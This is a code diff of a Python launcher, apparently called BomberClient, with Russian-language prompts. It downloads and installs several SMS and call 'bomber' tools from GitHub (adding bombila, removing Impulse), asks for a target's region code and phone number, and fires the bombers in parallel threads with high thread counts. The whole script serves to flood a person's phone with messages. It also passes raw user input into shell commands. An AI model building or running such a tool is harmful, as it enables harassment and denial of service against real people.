@@ -5,15 +5,27 @@ import sys
 from threading import Thread
 import time
 from colorama import Fore, Back
+from tkinter import Button, Label, Tk, ttk
+from tkinter import filedialog
 
 clearmode = '0'
+
+def clicked():
+    global UP
+    UP = filedialog.askdirectory()
+    UP = UP + '/BomberClient/'
+    print(UP)
+    #text.configure(text='YOU CAN CLOSE THIS WINDOW NOW')
+    
+
+
 sysname = sys.platform
 if sys.platform == 'win32':
     clearmode = 'CLS'
 if sys.platform == 'Linux':
     clearmode = 'clear'
 
-checkImpulse = False
+checkBila = False
 checkB3 = False
 checkYASB = False
 def Download():
@@ -27,22 +39,21 @@ def Download():
         os.chdir(UP + 'YetAnotherSMSBomber')
         os.system(f'pip install -r requirements.txt')
         os.chdir(UP)
-    if checkImpulse == False:
-        subprocess.call(f'git clone https://github.com/LimerBoy/Impulse', shell=True)
-        os.chdir(UP + 'Impulse')
-        os.system(f'pip install -r requirements.txt')
-        print('Установлен Impulse')
-        os.chdir(UP)
     if checkB3 == False:
         os.system(f'git clone https://github.com/iMro0t/bomb3r.git')
         os.chdir(UP + 'bomb3r')
         os.system(f'pip install -r requirements.txt')
         print('Установлен bomb3r')
         os.chdir(UP)
+    if checkBila == False:
+        subprocess.call(f'git clone https://github.com/Snekyy/bombila.git', shell=True)
+        os.chdir(UP + 'bombila')
+        os.system(f'pip install -r requirements.txt')
+        os.chdir(UP)
 
  #Функция экрана ввода номера телефона 
 RC = 0
-num= 0
+num = 0
     
 def logo():
     os.system(clearmode)
@@ -61,18 +72,17 @@ def logo():
 logo()
 print(Fore.RED + 'Download Mode' + Fore.RESET)
 time.sleep(2)
-UP = 'def'
 name = getpass.getuser()
-#для windows установка проходит в корень D:\, с установкой на С:\ проблемы ввиде permission denied
-if sys.platform == 'win32':
-    UP = 'D:\\BomberClient/'
-elif sys.platform == 'linux': 
-    UP = '/home/'+ name +'/BomberClient/'
+
+UP = 'def'
+clicked()
+
 if os.path.isdir(UP):
     logo()
 
     os.chdir(UP)
     print('ver 0.1\n')
+    print(UP)
     #стоит создать переменные кода региона, номер без региона и полный номер(разные бомберы юзают разный формат ввода номера)
     RC = input(Fore.BLACK + Back.GREEN + 'Введите код Региона без +() -->' + Back.RESET + Fore.RESET)
     num = input(Fore.BLACK + Back.GREEN + 'Введите номер() -->' + Back.RESET + Fore.RESET)
@@ -97,16 +107,26 @@ if os.path.isdir(UP):
         os.system('python3 bomber.py --sms -C ' + RC + ' -T 15 ' + num)
     B3Th = Thread(target=B3)
     B3Th.start()
+    def BILA():
+      os.chdir(UP + 'bombila')
+      os.system('python3 bombila.py -c ' + RC + '-p ' + num + '-t 700 --threads 1007 -T 3')
 
 
 
 
 #первый запуск скрипта  
 else:
+    fileshoose = Tk()
+    text = Label(fileshoose, text='CHOOSE DOWNLOAD DIR', fg='white', bg='black')
+    text.grid()
+    button = Button(fileshoose, text='locate', command=clicked)
+    button.grid()
+    fileshoose.mainloop()
     print('  \nПапки клиента не существует, создание папки и установка бомберов')
     Download()
     logo()
-    main()
+    print('reboot program now')
+
 
 
 
